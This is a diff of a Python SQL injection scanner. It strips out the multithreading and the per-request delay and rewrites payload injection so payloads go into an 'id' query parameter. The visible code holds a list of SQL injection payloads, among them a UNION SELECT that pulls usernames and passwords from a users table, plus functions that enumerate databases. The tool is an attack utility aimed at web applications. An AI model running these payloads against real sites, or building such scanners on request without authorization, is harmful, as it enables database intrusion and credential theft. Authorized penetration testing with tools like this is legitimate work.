@@ -1,16 +1,13 @@
 import requests
-from urllib.parse import urljoin, urlparse
-from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse, urlencode
 import logging
-import threading
 import time
-from queue import Queue
 from colorama import Fore, init
 
 # Initialize colorama for colored output
 init(autoreset=True)
 
-# Set up logging with colorized output
+# Set up logging
 logger = logging.getLogger()
 
 class ColorizedFormatter(logging.Formatter):
@@ -44,12 +41,6 @@ SQLI_PAYLOADS = [
     "' UNION SELECT null, username, password FROM users --"  # Union to get usernames and passwords
 ]
 
-# Configuration for the scanner
-MAX_THREADS = 10  # Maximum number of threads for concurrent scanning
-REQUEST_DELAY = 1  # Delay between requests to avoid overloading the server
-url_queue = Queue()
-threads = []
-
 # The function to perform SQLi scanning
 def scan_url(url, session, dbs=False):
     try:
@@ -70,7 +61,10 @@ def scan_url(url, session, dbs=False):
 
 # Function to test SQL Injection vulnerabilities
 def test_sqli(url, payload, session):
-    test_url = f"{url}{payload}"
+    # Ensure payload is correctly appended to the query string
+    parsed_url = urlparse(url)
+    query_string = urlencode({'id': payload})
+    test_url = parsed_url._replace(query=query_string).geturl()
     
     try:
         response = session.get(test_url, timeout=10)
@@ -105,32 +99,6 @@ def retrieve_databases(url, session):
     except requests.exceptions.RequestException as e:
         logger.critical(f"Request failed for {url} with enum db payload: {str(e)}")
 
-# Worker function for threading
-def worker():
-    session = requests.Session()
-    while not url_queue.empty():
-        url, dbs = url_queue.get()
-        scan_url(url, session, dbs)
-        time.sleep(REQUEST_DELAY)
-
-# Function to start scanning process with threading
-def start_scanning(base_url, dbs=False):
-    session = requests.Session()
-    
-    # Add initial URL to queue
-    url_queue.put((base_url, dbs))
-    
-    # Create and start threads
-    for i in range(MAX_THREADS):
-        t = threading.Thread(target=worker)
-        t.daemon = True
-        t.start()
-        threads.append(t)
-    
-    # Wait for threads to finish
-    for t in threads:
-        t.join()
-
 # Main function to start the scanning
 def main():
     import argparse
@@ -142,8 +110,8 @@ def main():
 
     logger.info(f"Starting SQL Injection scan on {args.url}...")
     
-    # Start scanning from the base URL
-    start_scanning(args.url, args.databases)
+    session = requests.Session()
+    scan_url(args.url, session, args.databases)
 
 if __name__ == "__main__":
     main()
